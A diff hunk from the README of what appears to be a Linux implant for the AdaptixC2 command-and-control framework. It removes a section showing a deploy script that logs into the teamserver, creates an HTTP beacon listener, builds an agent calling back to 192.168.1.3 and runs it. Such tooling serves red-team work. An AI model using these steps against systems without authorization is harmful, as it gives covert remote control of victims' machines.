@@ -103,23 +103,6 @@ chmod +x jinxed_amd64
 The session appears in the client with the Linux hostname, distro, kernel and
 architecture.
 
-### Headless deployment (REST API)
-
-The official client is not required. `scripts/deploy.py` logs in, creates a
-`BeaconHTTP` listener, builds the payload through the extender and (with
-`--run`) starts it:
-
-```bash
-pip install httpx
-ADAPTIX_BASE=https://127.0.0.1:7876/endpoint ADAPTIX_USER=operator1 ADAPTIX_PASS='...' \
-  ./scripts/deploy.py --listener linux-http --callback 192.168.1.3 --port 8080 \
-      --arch amd64 --out /tmp/jinxed_amd64 --run
-```
-
-It uses exactly the endpoints the AdaptixC2 MCP server and the Qt client use
-(`/login`, `/listener/create`, `/agent/generate`), so it behaves identically to
-a GUI build.
-
 ### Standalone agent build (no teamserver)
 
 The agent compiles on its own, but a binary built from the checked-in
